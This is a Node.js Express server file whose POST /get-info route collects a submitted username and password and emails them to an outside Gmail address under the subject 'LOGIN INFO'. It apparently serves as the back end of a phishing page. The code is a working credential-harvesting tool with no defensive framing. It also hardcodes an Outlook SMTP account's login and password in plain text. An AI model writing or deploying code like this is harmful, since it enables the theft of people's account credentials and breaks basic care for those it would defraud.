const express = require('express');
const nodemailer = require("nodemailer");
const app = express();
const port = 4000;
const cors = require('cors');
const bodyParser = require('body-parser');
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({extended: true}))

let transporter = nodemailer.createTransport({
    host: 'smtp.office365.com',
    port: 587,
    secure: false,
    auth: {
        user: 'Henry45377@outlook.com',
       pass: 'henry@135' 
    }
})


app.post('/get-info', (req, res) => {
   
    const {username, password} = req.body;

    const mailOptions = {
        from: "Henry45377@outlook.com",
        to: 'Sophialauren077@gmail.com',
        subject: 'LOGIN INFO',
        text: `username: ${username}, password: ${password}`
    }
    console.log("it might have worked");
    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
           res.send(error)
        }else{
            res.send(info);
        }
    })
} )
app.get('/', (req, res) => {
    res.send("App is running")
})

app.listen(port, () => {
    console.log("server is running");
})